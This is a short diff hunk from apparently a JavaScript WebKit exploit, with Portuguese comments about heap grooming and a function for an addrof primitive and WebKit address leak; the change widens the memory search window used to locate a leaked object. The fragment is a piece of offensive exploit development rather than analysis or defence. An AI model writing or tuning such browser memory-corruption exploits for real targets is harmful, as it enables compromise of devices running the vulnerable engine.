@@ -105,7 +105,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         // PONTO DE AJUSTE CRÍTICO: Mantemos a janela de busca PEQUENA e ESTÁVEL.
         // O Heap Grooming aumenta a chance do leaker estar aqui perto.
-        const SEARCH_WINDOW = 0x100000 - 0x2000; // ~1MB, com margem de segurança.
+        const SEARCH_WINDOW = 0x100000 + 0x8000; // ~1MB, com margem de segurança.
 
         logS3(`Iniciando busca na memória de [${toHex(SEARCH_START_OFFSET)}] até [${toHex(SEARCH_START_OFFSET + SEARCH_WINDOW)}] (janela estável)`, 'info');
 
